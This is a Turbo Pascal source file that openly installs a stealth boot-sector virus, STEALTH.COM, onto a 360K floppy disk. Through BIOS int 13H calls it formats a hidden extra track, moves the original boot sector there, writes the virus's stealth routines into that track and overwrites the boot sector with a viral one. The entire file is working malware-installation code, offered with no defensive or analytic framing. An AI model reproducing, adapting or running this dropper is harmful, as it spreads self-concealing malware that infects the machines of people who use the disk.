program put_360;     {This program puts the stealth virus STEALTH.COM on a   }
                     {360K floppy diskette.                                  }
uses dos;

type
  rec_spec         =record       {Record for formatting sectors w/ int 13H}
    cyl            :byte;                    {Cylinder (Track) number}
    head           :byte;                    {Head number}
    rec            :byte;                    {Record (sector) number}
    number         :byte;                    {Size (2=512 bytes/sec)}
    end;

const                            {Data to format 6 secs @ Trk 40, Hd 1, Sec 1-6}
  rec_defs         :array[1..6] of rec_spec=((cyl:40;head:1;rec:1;number:2),
                                             (cyl:40;head:1;rec:2;number:2),
                                             (cyl:40;head:1;rec:3;number:2),
                                             (cyl:40;head:1;rec:4;number:2),
                                             (cyl:40;head:1;rec:5;number:2),
                                             (cyl:40;head:1;rec:6;number:2));

var
  disk_buffer      :array[0..5119] of byte;  {Data area to read virus into}
  boot             :array[0..511] of byte;   {Data area to read boot sec into}
  virus            :file;                    {Virus code file variable}


{This function executes a BIOS Disk Access (int 13H) call.}
function biosdisk(cmd,drive,head,track,sector,nsects:integer;
                  buffer:pointer):byte;
var
  regs             :registers;
begin
  regs.AH:=cmd;                              {ah = function number}
  regs.DL:=drive;                            {dl = drive number}
  regs.DH:=head;                             {dh = head number}
  regs.CH:=track;                            {ch = track number}
  regs.CL:=sector;                           {cl = sector number}
  regs.AL:=nsects;                           {al = # of sectors to operate on}
  regs.ES:=seg(buffer^);                     {es:bx = data buffer}
  regs.BX:=ofs(buffer^);
  intr($13,regs);                            {Execute the interrupt}
  biosdisk:=regs.AH;                         {Return code in ah}
end;


begin
  if biosdisk(5,0,1,40,1,6,@rec_defs)<>0 then    {Format 6 recs @ Trk 40, Hd 1}
    writeln('Couldn''t format extra track on disk!');
  if biosdisk(2,0,0,0,1,1 ,@boot)<>0 then        {Read original boot sector}
    writeln('Couldn''t read original boot sector!');
  if biosdisk(3,0,1,40,6,1,@boot)<>0 then        {Put it @ Trk 40, Hd 1, Sec 6}
    writeln('Couldn''t write original boot sector!');
  assign(virus,'STEALTH.COM');                   {Open the virus code file}
  reset(virus,256);
  seek(virus,$6F);                               {Position fp to start of code}
  BlockRead(virus,disk_buffer,10);               {Read 5 sectors to ram}
  if biosdisk(3,0,1,40,1,5,@disk_buffer)<>0 then {Write @ Trk 40, Hd 1, Sec 1}
    writeln('Couldn''t write stealth routines to disk!');
  seek(virus,$7B);                               {Position fp to viral boot sec}
  BlockRead(virus,disk_buffer,2);                {Read it}
  move(boot[3],disk_buffer[3],$32);              {Move orig boot data into it}
  if biosdisk(3,0,0,0,1,1,@disk_buffer)<>0 then  {And make it the new boot sec}
    writeln('Couldn''t write viral boot sector to disk!');
  close(virus);
end.
